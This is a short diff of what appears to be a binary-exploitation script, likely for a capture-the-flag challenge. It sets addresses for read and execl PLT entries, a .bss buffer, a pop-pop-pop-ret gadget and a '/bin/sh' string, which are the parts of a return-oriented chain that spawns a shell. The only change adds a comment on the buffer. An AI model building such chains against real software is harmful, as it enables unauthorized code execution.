@@ -4,7 +4,7 @@ from tio import *
  
 read_plt = 0x08048620
 execl_plt = 0x08048710
-buf = 0x0804B0A0
+buf = 0x0804B0A0  #.bss section (char s[5000])
 pop3ret = 0x08048CD8   #pop ebx; pop edi; pop ebp; retn
 binsh = 0x0804970D
  
